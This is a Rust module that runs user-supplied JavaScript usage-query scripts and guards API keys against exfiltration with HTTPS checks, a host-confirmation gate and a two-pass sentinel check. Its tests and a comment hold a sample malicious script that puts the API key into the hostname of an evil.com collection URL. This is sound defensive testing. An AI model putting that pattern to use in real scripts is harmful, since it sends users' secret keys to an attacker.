use rquickjs::{Context, Function, Runtime};
use serde_json::Value;
use std::collections::HashMap;
use url::{Host, Url};

use crate::error::AppError;

/// 用量脚本执行结果（P0-2）。
///
/// custom 用量脚本首次向非回环主机外发时会走“域名确认闸门”：真实密钥不出网，转而返回
/// [`UsageScriptOutcome::NeedsConfirmation`] 携带目标 host 交前端确认。
pub enum UsageScriptOutcome {
    /// 脚本成功执行并返回用量数据 JSON。
    Completed(Value),
    /// 首次外发需用户确认目标 host（此刻真实密钥尚未注入外发）。
    NeedsConfirmation { host: String },
}

/// TOCTOU 两遍法第一遍注入密钥类变量时使用的哨兵值。
///
/// 哨兵值必须与真实密钥不同，才能在“注入前算 host / 注入后再算 host”两遍之间发现把密钥
/// 编入主机名（如 `https://{{apiKey}}.evil.com`）的行为——两遍 host 不一致即拒绝。取值为
/// DNS 合法字符（小写字母 / 数字 / 连字符），即便被拼进主机名也能被 URL 正常解析出来比对。
const SENTINEL_API_KEY: &str = "usage-script-sentinel-key";
const SENTINEL_ACCESS_TOKEN: &str = "usage-script-sentinel-token";

/// 执行用量查询脚本。
///
/// - **非 custom 模板**：单遍法。注入真实密钥后由 `validate_request_url` 的同源校验把请求
///   host 钉死在 `base_url` 上，无需确认闸门（行为与历史一致）。
/// - **custom 模板**：两遍法（TOCTOU 防护 + 域名确认闸门）。第一遍用哨兵值替换密钥类变量
///   （`{{apiKey}}`/`{{accessToken}}`；`{{baseUrl}}`/`{{userId}}` 保留真实）算出目标 host 并
///   做 HTTPS 校验；目标非回环且未确认（或已确认 host 不匹配）时返回 `NeedsConfirmation`，
///   真实密钥绝不出网。仅当目标 host 已确认（或为回环）时，第二遍才注入真实密钥、再次校验
///   host 与第一遍一致后才发起请求。`confirmed_host` 为该 provider 已确认的目标 host 标签。
#[allow(clippy::too_many_arguments)]
pub async fn execute_usage_script(
    script_code: &str,
    api_key: &str,
    base_url: &str,
    timeout_secs: u64,
    access_token: Option<&str>,
    user_id: Option<&str>,
    template_type: Option<&str>,
    confirmed_host: Option<&str>,
) -> Result<UsageScriptOutcome, AppError> {
    // 检测是否为自定义模板模式（优先使用前端传递的 template_type）
    let is_custom_template = template_type.map(|t| t == "custom").unwrap_or(false);

    // 验证 base_url 的安全性（仅非 custom 且非空时；custom 允许脚本内直接写完整 URL）
    if should_validate_base_url(base_url, is_custom_template) {
        validate_base_url(base_url)?;
    }

    // 注入真实密钥的脚本。非 custom 直接使用；custom 仅在通过确认闸门后才使用。
    let real_script = build_script_with_vars(script_code, api_key, base_url, access_token, user_id);

    // 解析出最终要发送的请求（custom 走两遍法 + 闸门；非 custom 走单遍法）。
    let request = if is_custom_template {
        // ── 第一遍（哨兵）：不注入真实密钥，仅算目标 host + 强制 HTTPS ──
        let sentinel_script = build_script_with_vars(
            script_code,
            SENTINEL_API_KEY,
            base_url,
            access_token.map(|_| SENTINEL_ACCESS_TOKEN),
            user_id,
        );
        let sentinel_request = eval_request_config(&sentinel_script)?;
        // custom 同样强制 HTTPS（仅回环可明文），但跳过同源检查。
        validate_request_url(&sentinel_request.url, base_url, true)?;
        let sentinel_url = parse_request_url(&sentinel_request.url)?;
        let sentinel_loopback = is_loopback_host(&sentinel_url);
        let sentinel_host = request_host_label(&sentinel_url)?;

        // ── 确认闸门：非回环且（未确认 / 已确认 host 不匹配）→ 拒发真实密钥，回传待确认 host ──
        if needs_host_confirmation(&sentinel_host, sentinel_loopback, confirmed_host) {
            return Ok(UsageScriptOutcome::NeedsConfirmation {
                host: sentinel_host,
            });
        }

        // ── 第二遍（真实）：注入真实密钥后重新算 host，必须与哨兵遍一致 ──
        let real_request = eval_request_config(&real_script)?;
        validate_request_url(&real_request.url, base_url, true)?;
        let real_url = parse_request_url(&real_request.url)?;
        let real_host = request_host_label(&real_url)?;
        if real_host != sentinel_host {
            // 注入真实密钥后目标 host 变化 → 疑似把密钥编进主机名（TOCTOU 外传通道），拒绝。
            return Err(AppError::localized(
                "usage_script.request_host_toctou",
                format!(
                    "注入密钥后请求目标由 {sentinel_host} 变为 {real_host}，疑似将密钥编入主机名，已拒绝"
                ),
                format!(
                    "Request target changed from {sentinel_host} to {real_host} after key injection (possible key-in-host exfiltration); blocked"
                ),
            ));
        }
        real_request
    } else {
        // ── 非 custom：单遍法，同源校验把 host 钉死在 base_url ──
        let request = eval_request_config(&real_script)?;
        validate_request_url(&request.url, base_url, false)?;
        request
    };

    // 发送 HTTP 请求（到这一步才真正携带真实密钥出网）。
    let response_data = send_http_request(&request, timeout_secs).await?;

    // 执行 extractor 得到用量数据。
    let result = run_extractor(&real_script, &response_data)?;

    // 验证返回值格式。
    validate_result(&result)?;

    Ok(UsageScriptOutcome::Completed(result))
}

/// 在独立作用域中 eval 脚本并提取 `request` 配置（确保 Runtime/Context 在 await 前释放）。
fn eval_request_config(script: &str) -> Result<RequestConfig, AppError> {
    let request_json = {
        let runtime = Runtime::new().map_err(|e| {
            AppError::localized(
                "usage_script.runtime_create_failed",
                format!("创建 JS 运行时失败: {e}"),
                format!("Failed to create JS runtime: {e}"),
            )
        })?;
        let context = Context::full(&runtime).map_err(|e| {
            AppError::localized(
                "usage_script.context_create_failed",
                format!("创建 JS 上下文失败: {e}"),
                format!("Failed to create JS context: {e}"),
            )
        })?;

        context.with(|ctx| {
            // 执行用户代码，获取配置对象
            let config: rquickjs::Object = ctx.eval(script.to_owned()).map_err(|e| {
                AppError::localized(
                    "usage_script.config_parse_failed",
                    format!("解析配置失败: {e}"),
                    format!("Failed to parse config: {e}"),
                )
            })?;

            // 提取 request 配置
            let request: rquickjs::Object = config.get("request").map_err(|e| {
                AppError::localized(
                    "usage_script.request_missing",
                    format!("缺少 request 配置: {e}"),
                    format!("Missing request config: {e}"),
                )
            })?;

            // 将 request 转换为 JSON 字符串
            let request_json: String = ctx
                .json_stringify(request)
                .map_err(|e| {
                    AppError::localized(
                        "usage_script.request_serialize_failed",
                        format!("序列化 request 失败: {e}"),
                        format!("Failed to serialize request: {e}"),
                    )
                })?
                .ok_or_else(|| {
                    AppError::localized(
                        "usage_script.serialize_none",
                        "序列化返回 None",
                        "Serialization returned None",
                    )
                })?
                .get()
                .map_err(|e| {
                    AppError::localized(
                        "usage_script.get_string_failed",
                        format!("获取字符串失败: {e}"),
                        format!("Failed to get string: {e}"),
                    )
                })?;

            Ok::<_, AppError>(request_json)
        })?
    }; // Runtime 和 Context 在这里被 drop

    serde_json::from_str(&request_json).map_err(|e| {
        AppError::localized(
            "usage_script.request_format_invalid",
            format!("request 配置格式错误: {e}"),
            format!("Invalid request config format: {e}"),
        )
    })
}

/// 在独立作用域中 eval 脚本并对响应执行 `extractor`（确保 Runtime/Context 在函数结束前释放）。
fn run_extractor(script: &str, response_data: &str) -> Result<Value, AppError> {
    let result: Value = {
        let runtime = Runtime::new().map_err(|e| {
            AppError::localized(
                "usage_script.runtime_create_failed",
                format!("创建 JS 运行时失败: {e}"),
                format!("Failed to create JS runtime: {e}"),
            )
        })?;
        let context = Context::full(&runtime).map_err(|e| {
            AppError::localized(
                "usage_script.context_create_failed",
                format!("创建 JS 上下文失败: {e}"),
                format!("Failed to create JS context: {e}"),
            )
        })?;

        context.with(|ctx| {
            // 重新 eval 获取配置对象
            let config: rquickjs::Object = ctx.eval(script.to_owned()).map_err(|e| {
                AppError::localized(
                    "usage_script.config_reparse_failed",
                    format!("重新解析配置失败: {e}"),
                    format!("Failed to re-parse config: {e}"),
                )
            })?;

            // 提取 extractor 函数
            let extractor: Function = config.get("extractor").map_err(|e| {
                AppError::localized(
                    "usage_script.extractor_missing",
                    format!("缺少 extractor 函数: {e}"),
                    format!("Missing extractor function: {e}"),
                )
            })?;

            // 将响应数据转换为 JS 值
            let response_js: rquickjs::Value = ctx.json_parse(response_data).map_err(|e| {
                AppError::localized(
                    "usage_script.response_parse_failed",
                    format!("解析响应 JSON 失败: {e}"),
                    format!("Failed to parse response JSON: {e}"),
                )
            })?;

            // 调用 extractor(response)
            let result_js: rquickjs::Value = extractor.call((response_js,)).map_err(|e| {
                AppError::localized(
                    "usage_script.extractor_exec_failed",
                    format!("执行 extractor 失败: {e}"),
                    format!("Failed to execute extractor: {e}"),
                )
            })?;

            // 转换为 JSON 字符串
            let result_json: String = ctx
                .json_stringify(result_js)
                .map_err(|e| {
                    AppError::localized(
                        "usage_script.result_serialize_failed",
                        format!("序列化结果失败: {e}"),
                        format!("Failed to serialize result: {e}"),
                    )
                })?
                .ok_or_else(|| {
                    AppError::localized(
                        "usage_script.serialize_none",
                        "序列化返回 None",
                        "Serialization returned None",
                    )
                })?
                .get()
                .map_err(|e| {
                    AppError::localized(
                        "usage_script.get_string_failed",
                        format!("获取字符串失败: {e}"),
                        format!("Failed to get string: {e}"),
                    )
                })?;

            // 解析为 serde_json::Value
            serde_json::from_str(&result_json).map_err(|e| {
                AppError::localized(
                    "usage_script.json_parse_failed",
                    format!("JSON 解析失败: {e}"),
                    format!("JSON parse failed: {e}"),
                )
            })
        })?
    }; // Runtime 和 Context 在这里被 drop

    Ok(result)
}

/// 请求配置结构
#[derive(Debug, serde::Deserialize)]
struct RequestConfig {
    url: String,
    method: String,
    #[serde(default)]
    headers: HashMap<String, String>,
    #[serde(default)]
    body: Option<String>,
}

/// 发送 HTTP 请求
async fn send_http_request(config: &RequestConfig, timeout_secs: u64) -> Result<String, AppError> {
    // 使用全局 HTTP 客户端（已包含代理配置）
    let client = crate::proxy::http_client::get();
    // 约束超时范围，防止异常配置导致长时间阻塞（最小 2 秒，最大 30 秒）
    let request_timeout = std::time::Duration::from_secs(timeout_secs.clamp(2, 30));

    // 严格校验 HTTP 方法，非法值不回退为 GET
    let method: reqwest::Method = config.method.parse().map_err(|_| {
        AppError::localized(
            "usage_script.invalid_http_method",
            format!("不支持的 HTTP 方法: {}", config.method),
            format!("Unsupported HTTP method: {}", config.method),
        )
    })?;

    let mut req = client
        .request(method.clone(), &config.url)
        .timeout(request_timeout);

    // 添加请求头
    for (k, v) in &config.headers {
        req = req.header(k, v);
    }

    // 添加请求体
    if let Some(body) = &config.body {
        req = req.body(body.clone());
    }

    // 发送请求
    let resp = req.send().await.map_err(|e| {
        AppError::localized(
            "usage_script.request_failed",
            format!("请求失败: {e}"),
            format!("Request failed: {e}"),
        )
    })?;

    let status = resp.status();
    let text = resp.text().await.map_err(|e| {
        AppError::localized(
            "usage_script.read_response_failed",
            format!("读取响应失败: {e}"),
            format!("Failed to read response: {e}"),
        )
    })?;

    if !status.is_success() {
        let preview = if text.len() > 200 {
            let mut safe_cut = 200usize;
            while !text.is_char_boundary(safe_cut) {
                safe_cut = safe_cut.saturating_sub(1);
            }
            format!("{}...", &text[..safe_cut])
        } else {
            text.clone()
        };
        return Err(AppError::localized(
            "usage_script.http_error",
            format!("HTTP {status} : {preview}"),
            format!("HTTP {status} : {preview}"),
        ));
    }

    Ok(text)
}

/// 验证脚本返回值（支持单对象或数组）
fn validate_result(result: &Value) -> Result<(), AppError> {
    // 如果是数组，验证每个元素
    if let Some(arr) = result.as_array() {
        if arr.is_empty() {
            return Err(AppError::localized(
                "usage_script.empty_array",
                "脚本返回的数组不能为空",
                "Script returned empty array",
            ));
        }
        for (idx, item) in arr.iter().enumerate() {
            validate_single_usage(item).map_err(|e| {
                AppError::localized(
                    "usage_script.array_validation_failed",
                    format!("数组索引[{idx}]验证失败: {e}"),
                    format!("Validation failed at index [{idx}]: {e}"),
                )
            })?;
        }
        return Ok(());
    }

    // 如果是单对象，直接验证（向后兼容）
    validate_single_usage(result)
}

/// 验证单个用量数据对象
fn validate_single_usage(result: &Value) -> Result<(), AppError> {
    let obj = result.as_object().ok_or_else(|| {
        AppError::localized(
            "usage_script.must_return_object",
            "脚本必须返回对象或对象数组",
            "Script must return object or array of objects",
        )
    })?;

    // 所有字段均为可选，只进行类型检查
    if obj.contains_key("isValid")
        && !result["isValid"].is_null()
        && !result["isValid"].is_boolean()
    {
        return Err(AppError::localized(
            "usage_script.isvalid_type_error",
            "isValid 必须是布尔值或 null",
            "isValid must be boolean or null",
        ));
    }
    if obj.contains_key("invalidMessage")
        && !result["invalidMessage"].is_null()
        && !result["invalidMessage"].is_string()
    {
        return Err(AppError::localized(
            "usage_script.invalidmessage_type_error",
            "invalidMessage 必须是字符串或 null",
            "invalidMessage must be string or null",
        ));
    }
    if obj.contains_key("remaining")
        && !result["remaining"].is_null()
        && !result["remaining"].is_number()
    {
        return Err(AppError::localized(
            "usage_script.remaining_type_error",
            "remaining 必须是数字或 null",
            "remaining must be number or null",
        ));
    }
    if obj.contains_key("unit") && !result["unit"].is_null() && !result["unit"].is_string() {
        return Err(AppError::localized(
            "usage_script.unit_type_error",
            "unit 必须是字符串或 null",
            "unit must be string or null",
        ));
    }
    if obj.contains_key("total") && !result["total"].is_null() && !result["total"].is_number() {
        return Err(AppError::localized(
            "usage_script.total_type_error",
            "total 必须是数字或 null",
            "total must be number or null",
        ));
    }
    if obj.contains_key("used") && !result["used"].is_null() && !result["used"].is_number() {
        return Err(AppError::localized(
            "usage_script.used_type_error",
            "used 必须是数字或 null",
            "used must be number or null",
        ));
    }
    if obj.contains_key("planName")
        && !result["planName"].is_null()
        && !result["planName"].is_string()
    {
        return Err(AppError::localized(
            "usage_script.planname_type_error",
            "planName 必须是字符串或 null",
            "planName must be string or null",
        ));
    }
    if obj.contains_key("extra") && !result["extra"].is_null() && !result["extra"].is_string() {
        return Err(AppError::localized(
            "usage_script.extra_type_error",
            "extra 必须是字符串或 null",
            "extra must be string or null",
        ));
    }

    Ok(())
}

/// 构建替换变量后的脚本，保持与旧版脚本的兼容性
fn build_script_with_vars(
    script_code: &str,
    api_key: &str,
    base_url: &str,
    access_token: Option<&str>,
    user_id: Option<&str>,
) -> String {
    let mut replaced = script_code
        .replace("{{apiKey}}", api_key)
        .replace("{{baseUrl}}", base_url);

    if let Some(token) = access_token {
        replaced = replaced.replace("{{accessToken}}", token);
    }
    if let Some(uid) = user_id {
        replaced = replaced.replace("{{userId}}", uid);
    }

    replaced
}

/// 验证 base_url 的基本安全性
fn validate_base_url(base_url: &str) -> Result<(), AppError> {
    if base_url.is_empty() {
        return Err(AppError::localized(
            "usage_script.base_url_empty",
            "base_url 不能为空",
            "base_url cannot be empty",
        ));
    }

    // 解析 URL
    let parsed_url = Url::parse(base_url).map_err(|e| {
        AppError::localized(
            "usage_script.base_url_invalid",
            format!("无效的 base_url: {e}"),
            format!("Invalid base_url: {e}"),
        )
    })?;

    let is_loopback = is_loopback_host(&parsed_url);

    // 必须是 HTTPS（允许 localhost 用于开发）
    if parsed_url.scheme() != "https" && !is_loopback {
        return Err(AppError::localized(
            "usage_script.base_url_https_required",
            "base_url 必须使用 HTTPS 协议（localhost 除外）",
            "base_url must use HTTPS (localhost allowed)",
        ));
    }

    // 检查主机名格式有效性
    let hostname = parsed_url.host_str().ok_or_else(|| {
        AppError::localized(
            "usage_script.base_url_hostname_missing",
            "base_url 必须包含有效的主机名",
            "base_url must include a valid hostname",
        )
    })?;

    // 基本的主机名格式检查
    if hostname.is_empty() {
        return Err(AppError::localized(
            "usage_script.base_url_hostname_empty",
            "base_url 主机名不能为空",
            "base_url hostname cannot be empty",
        ));
    }

    Ok(())
}

fn should_validate_base_url(base_url: &str, is_custom_template: bool) -> bool {
    !base_url.is_empty() && !is_custom_template
}

/// 验证请求 URL 是否安全（HTTPS 强制 + 同源检查）
fn validate_request_url(
    request_url: &str,
    base_url: &str,
    is_custom_template: bool,
) -> Result<(), AppError> {
    // 解析请求 URL
    let parsed_request = Url::parse(request_url).map_err(|e| {
        AppError::localized(
            "usage_script.request_url_invalid",
            format!("无效的请求 URL: {e}"),
            format!("Invalid request URL: {e}"),
        )
    })?;

    let is_request_loopback = is_loopback_host(&parsed_request);

    // 必须使用 HTTPS（仅回环 localhost 可用明文，便于本地开发）。
    //
    // 安全要点：自定义模板模式**同样**强制 HTTPS。custom 模式仅放宽“与 base_url 同源”
    // 的约束（允许访问独立的额度查询域名），但绝不放宽传输加密——脚本会把 `{{apiKey}}`
    // 前置替换进请求再由 Rust 侧发起，明文 HTTP 发往任意主机即构成真实密钥外传通道
    // （阶段 1 报告 §4.3 ②）。故此处不再因 custom 模式豁免 HTTPS。
    if parsed_request.scheme() != "https" && !is_request_loopback {
        return Err(AppError::localized(
            "usage_script.request_https_required",
            "请求 URL 必须使用 HTTPS 协议（localhost 除外）",
            "Request URL must use HTTPS (localhost allowed)",
        ));
    }

    // 如果提供了 base_url（非空），则进行同源检查
    // 🔧 自定义模板模式下，用户可以自由访问任意 HTTPS 域名，跳过同源检查
    if !base_url.is_empty() && !is_custom_template {
        // 解析 base URL
        let parsed_base = Url::parse(base_url).map_err(|e| {
            AppError::localized(
                "usage_script.base_url_invalid",
                format!("无效的 base_url: {e}"),
                format!("Invalid base_url: {e}"),
            )
        })?;

        // 核心安全检查：必须与 base_url 同源（相同域名和端口）
        if parsed_request.host_str() != parsed_base.host_str() {
            return Err(AppError::localized(
                "usage_script.request_host_mismatch",
                format!(
                    "请求域名 {} 与 base_url 域名 {} 不匹配（必须是同源请求）",
                    parsed_request.host_str().unwrap_or("unknown"),
                    parsed_base.host_str().unwrap_or("unknown")
                ),
                format!(
                    "Request host {} must match base_url host {} (same-origin required)",
                    parsed_request.host_str().unwrap_or("unknown"),
                    parsed_base.host_str().unwrap_or("unknown")
                ),
            ));
        }

        // 检查端口是否匹配（考虑默认端口）
        // 使用 port_or_known_default() 会自动处理默认端口（http->80, https->443）
        match (
            parsed_request.port_or_known_default(),
            parsed_base.port_or_known_default(),
        ) {
            (Some(request_port), Some(base_port)) if request_port == base_port => {
                // 端口匹配，继续执行
            }
            (Some(request_port), Some(base_port)) => {
                return Err(AppError::localized(
                    "usage_script.request_port_mismatch",
                    format!("请求端口 {request_port} 必须与 base_url 端口 {base_port} 匹配"),
                    format!("Request port {request_port} must match base_url port {base_port}"),
                ));
            }
            _ => {
                // 理论上不会发生，因为 port_or_known_default() 应该总是返回 Some
                return Err(AppError::localized(
                    "usage_script.request_port_unknown",
                    "无法确定端口号",
                    "Unable to determine port number",
                ));
            }
        }
    }

    Ok(())
}

/// 判断 URL 是否指向本机（localhost / loopback）
fn is_loopback_host(url: &Url) -> bool {
    match url.host() {
        Some(Host::Domain(d)) => d.eq_ignore_ascii_case("localhost"),
        Some(Host::Ipv4(ip)) => ip.is_loopback(),
        Some(Host::Ipv6(ip)) => ip.is_loopback(),
        _ => false,
    }
}

/// 解析请求 URL（错误消息与 `validate_request_url` 保持一致）。
fn parse_request_url(request_url: &str) -> Result<Url, AppError> {
    Url::parse(request_url).map_err(|e| {
        AppError::localized(
            "usage_script.request_url_invalid",
            format!("无效的请求 URL: {e}"),
            format!("Invalid request URL: {e}"),
        )
    })
}

/// 目标主机的规范化标签：用于确认闸门的持久化 / 展示 / 两遍一致性比对。
///
/// 默认端口（https:443 / http:80）省略；非默认端口以 `host:port` 保留；host 统一小写。
/// 这样 `https://api.example.com` 与 `https://api.example.com:443/x` 归一化为同一标签，而
/// `https://api.example.com:8443` 则单独成一标签（端口不同视为不同目标）。
fn request_host_label(url: &Url) -> Result<String, AppError> {
    let host = url
        .host_str()
        .ok_or_else(|| {
            AppError::localized(
                "usage_script.request_host_missing",
                "请求 URL 缺少有效主机名",
                "Request URL is missing a valid hostname",
            )
        })?
        .to_ascii_lowercase();
    Ok(match url.port() {
        Some(port) if default_port_for_scheme(url.scheme()) != Some(port) => {
            format!("{host}:{port}")
        }
        _ => host,
    })
}

/// 已知 scheme 的默认端口（用于在 host 标签中省略默认端口）。
fn default_port_for_scheme(scheme: &str) -> Option<u16> {
    match scheme {
        "https" => Some(443),
        "http" => Some(80),
        _ => None,
    }
}

/// 判断某目标 host 是否需要用户确认后才能外发真实密钥（P0-2 域名确认闸门）。
///
/// 回环（localhost / 127.0.0.1 等）豁免以便本地开发；否则要求 `confirmed_host` 与目标
/// host 标签完全一致，未确认或 host 变更（不匹配）都会触发确认。
fn needs_host_confirmation(
    host_label: &str,
    is_loopback: bool,
    confirmed_host: Option<&str>,
) -> bool {
    !is_loopback && confirmed_host != Some(host_label)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_https_bypass_prevention() {
        // 非本地域名的 HTTP 应该被拒绝
        let result = validate_base_url("http://127.0.0.1.evil.com/api");
        assert!(
            result.is_err(),
            "Should reject HTTP for non-localhost domains"
        );
    }

    #[test]
    fn test_custom_template_allows_cross_origin_https_request() {
        // custom 模式放宽“同源”约束：允许访问与 base_url 不同的 HTTPS 额度域名。
        let result = validate_request_url(
            "https://quota.example.net/user/balance",
            "https://api.example.com/anthropic",
            true,
        );
        assert!(
            result.is_ok(),
            "Custom scripts may call a different-origin HTTPS quota endpoint"
        );
    }

    #[test]
    fn test_custom_template_still_enforces_https_for_non_loopback() {
        // 安全回归：custom 模式不再豁免 HTTPS。明文 HTTP 发往非回环主机会外传 {{apiKey}}，
        // 必须被拒绝（阶段 1 报告 §4.3 ②）。
        let result = validate_request_url(
            "http://10.37.192.156:18344/user/balance",
            "http://10.37.192.156:8090/anthropic",
            true,
        );
        assert!(
            result.is_err(),
            "Custom scripts must not exfiltrate keys over plaintext HTTP to a non-loopback host"
        );
    }

    #[test]
    fn test_custom_template_allows_loopback_http_for_dev() {
        // 回环明文仍允许，便于本地开发自建额度端点。
        let result = validate_request_url("http://127.0.0.1:18344/user/balance", "", true);
        assert!(
            result.is_ok(),
            "Loopback HTTP remains allowed for local development"
        );
    }

    #[test]
    fn test_port_comparison() {
        // 测试端口比较逻辑是否正确处理默认端口和显式端口

        // 测试用例：(base_url, request_url, should_match)
        let test_cases = vec![
            // HTTPS默认端口测试
            (
                "https://api.example.com",
                "https://api.example.com/v1/test",
                true,
            ),
            (
                "https://api.example.com",
                "https://api.example.com:443/v1/test",
                true,
            ),
            (
                "https://api.example.com:443",
                "https://api.example.com/v1/test",
                true,
            ),
            (
                "https://api.example.com:443",
                "https://api.example.com:443/v1/test",
                true,
            ),
            // 端口不匹配测试
            (
                "https://api.example.com",
                "https://api.example.com:8443/v1/test",
                false,
            ),
            (
                "https://api.example.com:443",
                "https://api.example.com:8443/v1/test",
                false,
            ),
        ];

        for (base_url, request_url, should_match) in test_cases {
            let result = validate_request_url(request_url, base_url, false);

            if should_match {
                assert!(
                    result.is_ok(),
                    "应该匹配的URL被拒绝: base_url={}, request_url={}, error={}",
                    base_url,
                    request_url,
                    result.unwrap_err()
                );
            } else {
                assert!(
                    result.is_err(),
                    "应该不匹配的URL被允许: base_url={}, request_url={}",
                    base_url,
                    request_url
                );
            }
        }
    }

    // ── P0-2 域名确认闸门 + TOCTOU 两遍法 ──

    #[test]
    fn test_request_host_label_omits_default_https_port() {
        let url = Url::parse("https://quota.example.net/user/balance").unwrap();
        assert_eq!(request_host_label(&url).unwrap(), "quota.example.net");
        let url = Url::parse("https://quota.example.net:443/x").unwrap();
        assert_eq!(request_host_label(&url).unwrap(), "quota.example.net");
    }

    #[test]
    fn test_request_host_label_keeps_custom_port_and_lowercases() {
        let url = Url::parse("https://Quota.Example.NET:8443/x").unwrap();
        assert_eq!(request_host_label(&url).unwrap(), "quota.example.net:8443");
    }

    #[test]
    fn test_confirmation_gate_requires_confirmation_for_new_or_changed_host() {
        // 非回环、未确认 → 需要确认
        assert!(needs_host_confirmation("quota.example.net", false, None));
        // 已确认其它 host → host 变更，需重新确认
        assert!(needs_host_confirmation(
            "quota.example.net",
            false,
            Some("old.example.com")
        ));
    }

    #[test]
    fn test_confirmation_gate_skips_confirmed_and_loopback() {
        // 已确认同一 host → 放行
        assert!(!needs_host_confirmation(
            "quota.example.net",
            false,
            Some("quota.example.net")
        ));
        // 回环豁免（即便未确认）
        assert!(!needs_host_confirmation("localhost", true, None));
        assert!(!needs_host_confirmation("127.0.0.1", true, None));
    }

    #[test]
    fn test_two_pass_detects_key_in_host_injection() {
        // 恶意脚本把 {{apiKey}} 编入主机名：两遍算出的 host 标签必然不同 → execute_usage_script
        // 的第二遍 host 比对会拒绝，密钥不会外传到 `<realkey>.evil.com`。
        let script = r#"({ request: { url: "https://{{apiKey}}.evil.com/collect", method: "GET" }, extractor: (r) => r })"#;

        let sentinel = build_script_with_vars(script, SENTINEL_API_KEY, "", None, None);
        let real = build_script_with_vars(script, "sk-real-secret", "", None, None);

        let sentinel_host =
            request_host_label(&Url::parse(&eval_request_config(&sentinel).unwrap().url).unwrap())
                .unwrap();
        let real_host =
            request_host_label(&Url::parse(&eval_request_config(&real).unwrap().url).unwrap())
                .unwrap();

        assert_ne!(
            sentinel_host, real_host,
            "key-in-host injection must yield differing host labels across the two passes"
        );
        assert_eq!(sentinel_host, "usage-script-sentinel-key.evil.com");
        assert_eq!(real_host, "sk-real-secret.evil.com");
    }

    #[test]
    fn test_two_pass_same_host_when_key_in_query() {
        // 密钥放在 query 而非 host：两遍 host 一致；是否放行取决于确认闸门，而非两遍比对。
        let script = r#"({ request: { url: "https://quota.example.net/u?k={{apiKey}}", method: "GET" }, extractor: (r) => r })"#;
        let sentinel = build_script_with_vars(script, SENTINEL_API_KEY, "", None, None);
        let real = build_script_with_vars(script, "sk-real-secret", "", None, None);
        let sentinel_host =
            request_host_label(&Url::parse(&eval_request_config(&sentinel).unwrap().url).unwrap())
                .unwrap();
        let real_host =
            request_host_label(&Url::parse(&eval_request_config(&real).unwrap().url).unwrap())
                .unwrap();
        assert_eq!(sentinel_host, real_host);
        assert_eq!(sentinel_host, "quota.example.net");
    }
}
